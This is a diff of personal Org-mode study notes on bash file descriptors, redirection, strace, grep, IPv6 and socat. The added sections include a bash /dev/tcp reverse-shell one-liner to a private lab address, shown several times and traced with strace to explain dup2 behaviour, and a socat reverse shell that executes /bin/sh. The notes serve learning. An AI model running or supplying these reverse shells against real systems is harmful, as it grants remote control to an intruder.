@@ -87,34 +87,41 @@
       - HISTSIZE //take effect immediately, numbers of commands stored in memory for the current session
       - HISTFILESIZE //numbers of commands to be stored in the .bash_history file
 *** //File Descriptor
-    + A File Descriptor (FD) is a number which refers to an open file.
-    #+begin_quote
-    Each process has its own private set of FDs, but FDs are inherited by child processes from the parent process.
+**** basic of FD
+    | FD | pointer |
+    |----+---------|
+    | 0  | stdin   |
+    | 1  | stdout  |
+    | 2  | stderr  |
 
-    Every process should inherit three open FDs from its parent: 0 ("standard input"), open for reading; and 1 ("standard output") and 2 ("standard error"), open for writing. A process that is started without one or more of these may behave unpredictably. (So never close stderr. Always redirect to /dev/null instead.)
-    #+end_quote
+    + A File Descriptor (FD) is a number which refers to an open file.
+      #+begin_quote
+      Each process has its own private set of FDs, but FDs are inherited by child processes from the parent process.
+      Every process should inherit three open FDs from its parent: *0 ("standard input")*, open for reading; and *1 ("standard output")* and *2 ("standard error")*, open for writing. A process that is started without one or more of these may behave unpredictably. (So never close stderr. Always redirect to /dev/null instead.)
+      #+end_quote
+
     + FD 3,4, ..., 9 are for additional files, need to be open first before used. For more info see:
       - [Advanced Bash-Scripting Guide: Chapter 20. I/O Redirection.](https://tldp.org/LDP/abs/html/io-redirection.html)
       - [how do file descriptors work](https://stackoverflow.com/questions/7082001/how-do-file-descriptors-work)
 
-    #+begin_src
-    exec 5<> /tmp/foo  #open fd 5, touch foo if not exist.
-    echo "1\n2\n 3456789" >&5
-    exec 5>&- #close fd 3.
-    cat /tmp/foo
-    rm /tmp/foo
-    #+end_src
+      #+begin_src
+      exec 5<> /tmp/foo  #open fd 5, touch foo if not exist.
+      echo "1\n2\n 3456789" >&5
+      exec 5>&- #close fd 3.
+      cat /tmp/foo
+      rm /tmp/foo
+      #+end_src
 
-**** FD and redirecting
-     + :> filename //truncates file "filename" to zero length, touch if not exist.
-     + 1>> filename //redirect and append stdout to file "filename"
-     + M>N 
+**** FD, basic of redirecting
+     + ~:> filename~ //truncates file "filename" to zero length, touch if not exist.
+     + ~1>> filename~ //redirect and append stdout to file "filename"
+     + ~M>N~ 
        - //"M" is a FD, which is defaults to 1 if not explicitly set.
-       - //"N" is a filename.
+       - // *"N" is a filename*.
        - //File descriptor "M" is redirect to file "N."
-     + M>&N
+     + ~M>&N~
        - //"M" is a FD, which is defaults to 1 if not explicitly set.
-       - //"N" is another FD.
+       - // *"N" is a FD*.
        - //"M" is redirected to "N". All output of file pointed to by M gets sent to file pointed to by N.
 
      + 0<filename, <filename //accept input from a file "filename"
@@ -123,7 +130,47 @@
      + ls ./nonExisting 2>error.txt
      + ls ./nonExisting 2>&1
      + wc -mwl < filename
-      
+
+**** advanced: the mechanisms && stdin, stdout, stderr redirecting.
+     + ~bash -i >& /dev/tcp/192.168.140.1/1337 0>&1~ //the meaning:
+***** the ~>&~ || ~&>~ //(if FD number is omitted):
+      1. *syntax for redirecting stderr*, the 3 variants are semantically equivalent:
+         - ~>& dst~
+         - ~&> dst~
+         - ~> dst 2>&1~ //most human readable
+           #+begin_src
+           strace -f bash -c 'ls a &> out' 2>&1 | grep -n dup2
+           # open, 3(out) => 1(stdout)>3, (dup2(3, 1)) => 2(stderr)>1, (dup2(1, 2))
+           strace -f bash -c 'ls a > out' 2>&1 | grep -n dup2
+           # open, 3(out) => 1(stdout)>3, (dup2(3, 1))
+           #+end_src
+
+      2. *omitting FDs*, if:
+         - ~<~ is the first character of the redirection operator: the redirection refers to FD 0(stdin) *dup2(3, 0)* //i.e. 0<fileIn
+         - ~>~ is the first character of the redirection operator: the redirection refers to FD 1(stdout) *dup2(3, 1)* //i.e. 1>fileOut
+
+***** the redirect operator: *associativity: l => r; the > operator only pass the pointer address of the FD*
+      + ~ls > outFile 2>&1~ //direct both FD 2(stderr) and FD 1(stdout) to the outFile
+      + ~ls 2>&1 > outFile~ //direct only FD 1(stdout) to the outFile, because the FD 2(stderr) was dumped to the FD 1 before the FD 1 goes to the outFile
+      + ~strace -f bash -c 'ls 2>&1 > outFile' > ls.out 2>&1~ //dup2(oldFD, newFD)
+        #+begin_src
+        dup2(1, 2)         # pointer address 2 === 1
+        # outFile -> 3
+        dup2(3, 1)         # pointer address 1 === 3, hence stderr not included
+        #+end_src
+      + ~strace -f bash -c 'ls > outFile 2>&1' > lsall.out 2>&1~ //dup2(oldFD, newFD)
+        #+begin_src
+        # outFile -> 3
+        dup2(3, 1)         # pointer address 1 === 3
+        close(3)
+        dup2(1, 2)         # pointer address 2 === 1, stderr included
+        #+end_src
+
+***** use the ~strace~:
+      + ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ //grep -n 192.168.140.1 strace.out, check syscalls around the line
+        - //1(stdout)>3(socket) => 0(stdin)>1(stdout, socket)
+        - //since the socket is bidirectional, both input and output are legal.
+
 *** apt(Advanced Package Tool)
     + apt update: update the db info
     + apt upgrade [<packageName>]
@@ -138,7 +185,8 @@
     + dpkg can call apt or use offline package
      
 *** grep
-    + grep -ri keyword /usr/bin
+    + ~grep -n(--line-number) <keyword> <fileName>~ //show the line number
+    + ~grep -ri <keyword> <directory>~
       - //read all files under each directory recursively, search for what matches the "keyword"
       - //i for --ignore-case 
 
@@ -282,6 +330,15 @@
       2. the device perform Duplicate Address Detection(DAD) by sending a *NS* message, in which, src = ::/128(unspecified address), dst = $addrD
       3. confirming no conflict, the device send a *RS* message, in which, src = $addrD, dst = ff02::2
       4. in response, the ipv6 router unicast an *RA* message, in which, src = fe80::x(router link-local), dst = $addrD; the message also contains ipv6 prefix, with which the device configure its *Global Unicast Address* (since the prefix and link-local is always 64 bits long); the message also contains other info such as MTU.
+
+*** socat
+    + ~socat [-u|U] TCP-LISTEN:127.0.0.1:1337,fork path/to/file~ //uni-directional mode: U for right to left, u for left to right. Be careful not to override the source file.
+    + ~socat tcp-connect:127.0.0.1:1337 exec:/bin/sh,stderr,pty[,setsid,sigint,sane]~ //reverse shell
+
+
+*** TODO linux syscalls
+    + ~strace -f~ //follow child processes created, syscall: fork
+      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
 
 ** TODO powershell scripting
 *** TODO basic params(-nop, -c, etc.)
